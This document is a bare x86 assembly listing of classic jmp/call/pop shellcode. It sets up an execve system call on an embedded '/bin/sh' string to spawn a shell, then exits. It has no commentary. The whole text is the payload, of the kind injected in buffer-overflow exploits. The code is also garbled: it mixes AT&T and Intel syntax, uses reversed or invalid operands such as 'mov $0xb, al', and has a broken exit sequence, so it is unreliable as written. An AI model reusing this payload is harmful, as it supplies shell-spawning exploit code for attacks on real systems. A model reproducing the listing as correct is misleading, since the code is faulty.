jmp line

address:
    pop esi
    mov esi, 0x08(esi)
    xor eax, eax
    mov eax, 0xc(esi)
    mov al, 0x7(esi)
    mov $0xb, al
    mov esi, ebx
    lea 0x8(esi), ecx
    lea 0xc(esi), edx
    int $0x80
    
    xor ebx, ebx
    mov ebx, eax
    inc eax
    int $0x80

line:
    call address
    .string "/bin/sh"